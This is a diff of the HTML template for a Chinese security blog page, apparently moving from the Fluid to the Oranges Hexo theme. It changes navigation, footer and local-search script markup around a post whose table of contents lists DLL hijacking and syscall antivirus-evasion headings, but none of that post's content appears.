-      <div class="license-meta-item">
-        <div>许可协议</div>
-        <div>
-          
-            
-            
-              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-              <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                <i class="iconfont icon-by"></i>
-              </span>
+              <a href="/posts/1e1eb3c9/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
               </a>
             
-          
-        </div>
-      </div>
-    </div>
-    <div class="license-icon iconfont"></div>
-  </div>
-
-
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/posts/ac2ce454/" title="CobaltStrike简单二开学习记录(上)">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">CobaltStrike简单二开学习记录(上)</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/posts/1e1eb3c9/" title="CTFShow Web入门_XSS">
-                        <span class="hidden-mobile">CTFShow Web入门_XSS</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-08-29 00:00:00
+            </span>
             
-          </article>
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E5%85%8D%E6%9D%80/" title="免杀">
+                        #免杀
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/posts/ac2ce454/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
         </div>
-      </div>
-    </div>
-
-    <div class="side-col d-none d-lg-block col-lg-2">
       
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DLL%E5%8A%AB%E6%8C%81%E4%B8%8ESyscall%E5%85%8D%E6%9D%80%E5%88%9D%E5%B0%9D%E8%AF%95"><span class="toc-text">DLL劫持与Syscall免杀初尝试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DLL%E5%8A%AB%E6%8C%81"><span class="toc-text">DLL劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DLL%E5%8A%AB%E6%8C%81-%E8%AF%AD%E8%A8%80-%E8%B0%83%E7%94%A8%E5%8A%A0%E8%BD%BD"><span class="toc-text">DLL劫持-语言-调用加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DLL%E5%8A%AB%E6%8C%81-%E7%99%BD%E5%8A%A0%E9%BB%91-%E5%AF%BC%E5%85%A5%E5%8A%A0%E8%BD%BD"><span class="toc-text">DLL劫持-白加黑-导入加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C-amp-C-DLL%E5%8A%AB%E6%8C%81-%E7%99%BD%E5%8A%A0%E9%BB%91-%E5%AF%BC%E5%87%BA%E7%BC%96%E8%AF%91"><span class="toc-text">C&amp;C++-DLL劫持-白加黑-导出编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C-amp-C-DLL%E5%8A%AB%E6%8C%81-%E7%99%BD%E5%8A%A0%E9%BB%91-%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB"><span class="toc-text">C&amp;C++-DLL劫持-白加黑-图片分离</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Syscall"><span class="toc-text">Syscall</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Syscall%E5%BA%95%E5%B1%82-%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%94%9F%E6%88%90-%E9%A1%B9%E7%9B%AE"><span class="toc-text">Syscall底层-加载器生成-项目</span></a></li></ol></li></ol></li></ol>
+      
     </div>
   </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2022 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
 </div>
 
 
+<script src="/js/backtotop.js"></script>
 
 
 
-  
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
 
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
       </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
+      <div class="search-result" id="search-result"></div>
     </div>
   </div>
-</div>
 
-    
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
 
-    
-  </main>
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
 
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
-    </div>
-  
-  
-  
-  
-</div>
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
 
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
       }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
   </script>
 
 
 
 
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      collapseDepth   : CONFIG.toc.collapseDepth || 0,
-      scrollSmooth    : true,
-      headingsOffset  : -boardTop
-    });
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
 
   
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-  });
-</script>
+<script src="/js/colorscheme.js"></script>
 
 
+
+
+
+        
   
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script  src="/js/local-search.js" ></script>
-
-
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + DLL%E5%8A%AB%E6%8C%81%E4%B8%8ESyscall%E5%85%8D%E6%9D%80%E5%88%9D%E5%B0%9D%E8%AF%95 + '&url=' + http%3A%2F%2Fexample.com%2Fposts%2Ffacab1e5%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/posts/facab1e5/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
   
+  
+<script src="/js/shares.js"></script>
 
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
-</body>
+
+
+      </div>
+    </div>
+  </body>
 </html>
